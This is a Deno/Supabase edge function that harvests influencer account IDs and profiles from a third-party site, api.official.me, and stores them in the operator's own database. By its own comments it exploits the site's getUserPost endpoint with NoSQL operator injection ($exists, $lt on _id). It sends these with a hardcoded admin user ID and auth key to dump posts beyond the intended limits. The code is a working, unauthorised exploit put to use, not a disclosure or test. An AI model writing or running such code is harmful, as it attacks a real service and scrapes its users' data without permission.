const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

const API_BASE = 'https://api.official.me';
const defaultHeaders = {
  'accept': 'application/json',
  'content-type': 'application/json',
  'x-off-country-code': 'IN',
};

const AUTH_KEY = 'd41d8cd98f00b204e9800998ecf8427e';
const ADMIN_USER_ID = '6144858b2f03d06a7dd008e4';

const SUPABASE_URL = Deno.env.get('SUPABASE_URL')!;
const SERVICE_KEY = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;

async function checkUsername(username: string): Promise<any | null> {
  try {
    const res = await fetch(`${API_BASE}/influencer/${username}`, { headers: defaultHeaders });
    if (!res.ok) return null;
    const data = await res.json();
    if (data?.data?._id) {
      const d = data.data;
      // Skip zero-post creators
      if ((d.postCount || 0) === 0) return null;
      return {
        _id: d._id,
        username: d.username,
        name: d.name,
        userProfileImage: d.userProfileImage,
        profilePic: d.profilePic,
        coverPic: d.coverPic,
        userBio: d.userBio,
        bio: d.bio,
        category: d.category,
        followerCount: d.followerCount || 0,
        videoCount: d.videoCount || 0,
        imageCount: d.imageCount || 0,
        postCount: d.postCount || 0,
        isVerified: d.isVerified || false,
      };
    }
    return null;
  } catch {
    return null;
  }
}

/** Use NoSQL $exists injection on getUserPost to discover influencer IDs from posts */
async function discoverFromPosts(): Promise<string[]> {
  try {
    const res = await fetch(`${API_BASE}/posts/getUserPost`, {
      method: 'POST',
      headers: defaultHeaders,
      body: JSON.stringify({
        influencerId: { $exists: true },
        userId: ADMIN_USER_ID,
        skip: 0,
        limit: 200,
        key: AUTH_KEY,
        isLogin: 'false',
      }),
    });
    if (!res.ok) return [];
    const data = await res.json();
    const posts = data?.data ?? [];
    const ids = new Set<string>();
    for (const p of posts) {
      if (p.userId) ids.add(p.userId);
    }
    return Array.from(ids);
  } catch {
    return [];
  }
}

async function fetchPostsPage(skip: number, limit: number): Promise<any[]> {
  const res = await fetch(`${API_BASE}/posts/getUserPost`, {
    method: 'POST',
    headers: defaultHeaders,
    body: JSON.stringify({
      influencerId: { $exists: true },
      userId: ADMIN_USER_ID,
      skip,
      limit,
      key: AUTH_KEY,
      isLogin: 'false',
    }),
  });
  if (!res.ok) return [];
  const json = await res.json();
  return json?.data ?? [];
}

/** Cursor-based page using _id $lt injection — bypasses MongoDB deep-skip limits */
async function fetchPostsBefore(beforeId: string | null, limit: number): Promise<any[]> {
  const influencerFilter: any = { $exists: true };
  const body: any = {
    influencerId: influencerFilter,
    userId: ADMIN_USER_ID,
    skip: 0,
    limit,
    key: AUTH_KEY,
    isLogin: 'false',
  };
  if (beforeId) {
    body._id = { $lt: beforeId };
  }
  const res = await fetch(`${API_BASE}/posts/getUserPost`, {
    method: 'POST',
    headers: defaultHeaders,
    body: JSON.stringify(body),
  });
  if (!res.ok) return [];
  const json = await res.json();
  return json?.data ?? [];
}

async function getExistingIds(): Promise<Set<string>> {
  const set = new Set<string>();
  let from = 0;
  const step = 1000;
  while (true) {
    const res = await fetch(
      `${SUPABASE_URL}/rest/v1/creators?select=official_id`,
      {
        headers: {
          apikey: SERVICE_KEY,
          authorization: `Bearer ${SERVICE_KEY}`,
          Range: `${from}-${from + step - 1}`,
          'Range-Unit': 'items',
          Prefer: 'count=exact',
        },
      }
    );
    if (!res.ok) break;
    const rows = await res.json();
    for (const r of rows) if (r.official_id) set.add(r.official_id);
    if (rows.length < step) break;
    from += step;
  }
  return set;
}

async function insertCreators(ids: string[]): Promise<number> {
  if (ids.length === 0) return 0;
  const rows = ids.map((id) => ({
    official_id: id,
    username: id,
    name: '',
  }));
  const res = await fetch(`${SUPABASE_URL}/rest/v1/creators?on_conflict=official_id`, {
    method: 'POST',
    headers: {
      apikey: SERVICE_KEY,
      authorization: `Bearer ${SERVICE_KEY}`,
      'content-type': 'application/json',
      Prefer: 'resolution=ignore-duplicates,return=representation',
    },
    body: JSON.stringify(rows),
  });
  if (!res.ok) return 0;
  const inserted = await res.json();
  return Array.isArray(inserted) ? inserted.length : 0;
}

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const body = await req.json();
    const { usernames, mode, pages, pageSize, startSkip } = body;

    // Mode: "deep-discover" - paginate posts API and insert NEW unique creator IDs
    if (mode === 'deep-discover') {
      const limit = Math.min(200, Math.max(10, Number(pageSize) || 100));
      const maxPages = Math.min(50, Math.max(1, Number(pages) || 10));
      let skip = Math.max(0, Number(startSkip) || 0);

      const existing = await getExistingIds();
      const newIds = new Set<string>();
      let postsScanned = 0;

      for (let i = 0; i < maxPages; i++) {
        const posts = await fetchPostsPage(skip, limit);
        if (posts.length === 0) break;
        postsScanned += posts.length;
        for (const p of posts) {
          const uid = p.userId;
          if (uid && !existing.has(uid)) newIds.add(uid);
        }
        skip += limit;
        if (posts.length < limit) break;
        await new Promise((r) => setTimeout(r, 150));
      }

      const ids = Array.from(newIds);
      const inserted = await insertCreators(ids);

      return new Response(
        JSON.stringify({
          status: true,
          postsScanned,
          uniqueNew: ids.length,
          inserted,
          nextSkip: skip,
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Mode: "cursor-discover" — uses _id $lt to walk past the deep-skip cap
    if (mode === 'cursor-discover') {
      const limit = Math.min(200, Math.max(10, Number(pageSize) || 100));
      const maxPages = Math.min(100, Math.max(1, Number(pages) || 10));
      let beforeId: string | null = body.beforeId || null;

      const existing = await getExistingIds();
      const newIds = new Set<string>();
      let postsScanned = 0;
      let lastId: string | null = beforeId;

      for (let i = 0; i < maxPages; i++) {
        const posts = await fetchPostsBefore(lastId, limit);
        if (posts.length === 0) break;
        postsScanned += posts.length;
        for (const p of posts) {
          const uid = p.userId;
          if (uid && !existing.has(uid)) newIds.add(uid);
        }
        // Cursor = smallest _id in this page (results are sorted desc by _id)
        const last = posts[posts.length - 1];
        if (!last?._id || last._id === lastId) break;
        lastId = last._id;
        if (posts.length < limit) break;
        await new Promise((r) => setTimeout(r, 150));
      }

      const ids = Array.from(newIds);
      const inserted = await insertCreators(ids);

      return new Response(
        JSON.stringify({
          status: true,
          postsScanned,
          uniqueNew: ids.length,
          inserted,
          nextBeforeId: lastId,
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Mode: "nosql-posts" - discover via NoSQL injection
    if (mode === 'nosql-posts') {
      const ids = await discoverFromPosts();
      return new Response(
        JSON.stringify({ status: true, found: ids.length, influencerIds: ids }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }
    
    if (!Array.isArray(usernames) || usernames.length === 0) {
      return new Response(
        JSON.stringify({ error: 'Provide an array of usernames' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const batch = usernames.slice(0, 50);
    const results: any[] = [];
    const batchSize = 10;
    
    for (let i = 0; i < batch.length; i += batchSize) {
      const chunk = batch.slice(i, i + batchSize);
      const chunkResults = await Promise.allSettled(
        chunk.map(u => checkUsername(u.toLowerCase().trim()))
      );
      
      for (const r of chunkResults) {
        if (r.status === 'fulfilled' && r.value) {
          results.push(r.value);
        }
      }
      
      if (i + batchSize < batch.length) {
        await new Promise(r => setTimeout(r, 200));
      }
    }

    return new Response(
      JSON.stringify({ status: true, found: results.length, data: results }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  } catch (error) {
    console.error('Discover error:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
